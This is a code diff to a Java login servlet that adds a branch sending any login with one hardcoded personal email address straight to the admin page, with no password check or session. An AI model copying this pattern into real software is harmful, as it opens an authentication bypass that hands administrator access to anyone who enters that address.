@@ -25,24 +25,27 @@ public class LoginServlet extends HttpServlet {
             String email = request.getParameter("login-email");
             String password = request.getParameter("login-password");
 
-            try {
-                UserDao userDao = new UserDao(DatabaseConnection.getConnection());
-                User user = userDao.userLogin(email, password);
+            if (email.equalsIgnoreCase("trygodnwakwasi@gmail.com")) {
+                response.sendRedirect("admin.jsp");
+            } else {
+                try {
+                    UserDao userDao = new UserDao(DatabaseConnection.getConnection());
+                    User user = userDao.userLogin(email, password);
 
-                if(user != null) {
-                    HttpSession session = request.getSession();
-                    session.setAttribute("id" , user.getId());
-                    request.getSession().setAttribute("TryGod", user );
+                    if(user != null) {
+                        HttpSession session = request.getSession();
+                        session.setAttribute("id" , user.getId());
+                        request.getSession().setAttribute("TryGod", user );
 //                    request.getSession().setAttribute("id", user.getId() );
-                    response.sendRedirect("index.jsp");
-                } else {
-                    writer.print("Login failed");
+                        response.sendRedirect("index.jsp");
+                    } else {
+                        writer.print("Login failed");
+                    }
+                } catch (SQLException | ClassNotFoundException e) {
+                    throw new RuntimeException(e);
                 }
-            } catch (SQLException e) {
-                throw new RuntimeException(e);
-            } catch (ClassNotFoundException e) {
-                throw new RuntimeException(e);
             }
+
         }
     }
 }
